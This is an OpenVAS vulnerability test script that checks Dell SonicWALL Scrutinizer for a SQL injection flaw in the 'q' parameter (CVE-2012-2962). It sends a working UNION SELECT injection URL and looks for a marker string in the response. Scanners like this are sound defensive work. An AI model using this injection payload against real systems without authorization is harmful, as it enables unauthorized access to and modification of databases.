###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_scrutinizer_54625.nasl 12 2013-10-27 11:15:33Z jan $
#
# Dell SonicWALL Scrutinizer 'q' Parameter SQL Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Dell SonicWALL Scrutinizer is prone to an SQL-injection vulnerability
because it fails to sufficiently sanitize user-supplied data.

A successful exploit may allow an attacker to compromise the
application, access or modify data, or exploit latent vulnerabilities
in the underlying database.

Dell SonicWALL Scrutinizer 9.0.1 is vulnerable; other versions may
also be affected.";

tag_solution = "Vendor updates are available. Please see the references for more
information.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103546";
CPE = "cpe:/a:dell:sonicwall_scrutinizer";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(54625);
 script_cve_id("CVE-2012-2962");
 script_tag(name:"cvss_base", value:"6.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:P/A:P");
 script_version ("$Revision: 12 $");

 script_name("Dell SonicWALL Scrutinizer 'q' Parameter SQL Injection Vulnerability");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/54625");

 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-08-21 09:30:41 +0200 (Tue, 21 Aug 2012)");
 script_description(desc);
 script_summary("Determine if sql injection is possible");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("gb_scrutinizer_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("scrutinizer/installed");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
   
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!get_port_state(port))exit(0);

if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID))exit(0);

url = dir + "/d4d/statusFilter.php?commonJson=protList&q=x'+union+select+0,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374'+--+";

if(http_vuln_check(port:port, url:url,pattern:"OpenVAS-SQL-Injection-Test")) {
     
  security_hole(port:port);
  exit(0);

}

exit(0);
